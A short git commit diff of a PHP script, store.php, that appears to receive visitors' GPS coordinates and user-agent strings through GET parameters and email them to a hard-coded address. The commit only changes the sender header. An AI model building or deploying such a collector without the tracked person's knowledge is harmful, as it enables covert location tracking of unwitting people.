9d655422b3628f3ade44715c0510231230ef60b6
Techza-code <intrepidtechza@gmail.com>
2024-10-07 14:43:27 +0200

    Update store.php

--- store.php
+++ store.php
@@ -8,7 +8,7 @@ if (isset($_GET['lat']) && isset($_GET['long']) && isset($_GET['uagent'])) {
     $to = 'intrepidtechza@gmail.com'; // Your email address
     $subject = 'GPS Coordinates';
     $message = "Latitude: $latitude\nLongitude: $longitude\nUser Agent: $userAgent";
-    $headers = 'From: no-reply@example.com' . "\r\n"; // Replace with a valid sender email
+    $headers = 'From: intrepidza@gmail.com' . "\r\n"; // Replace with a valid sender email
 
     // Send email
     if(mail($to, $subject, $message, $headers)) {
